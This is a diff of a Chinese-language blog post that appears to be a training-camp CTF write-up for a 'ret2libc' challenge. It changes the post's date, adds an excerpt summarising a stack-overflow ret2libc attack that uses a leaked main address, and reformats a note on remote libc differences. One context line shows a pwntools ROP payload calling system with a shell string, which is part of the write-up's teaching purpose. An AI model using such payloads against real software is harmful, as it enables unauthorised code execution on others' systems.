@@ -1,8 +1,9 @@
 ---
 title: 赛博协会训练营 - ret2libc
-date: 2023/12/3 12:00:00
+date: 2023/9/18 12:00:00
 tags:
     - noob
+excerpt: 通过分析`ret2libc`题目，利用栈溢出和泄露main地址实现ret2libc攻击，最终成功获取flag。
 ---
 
 from cbctf starter 2023
@@ -70,9 +71,8 @@ sh.sendline(b'0'*0x18 + p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(sy
 
 sh.interactive()
 ```
-
-## 本题获得的教训
-
+{% notel green 本题获得的教训 %}
 由于远端libc的不同，main在stack上的地址也是不一样的
+{% endnotel %}
 
 Done.
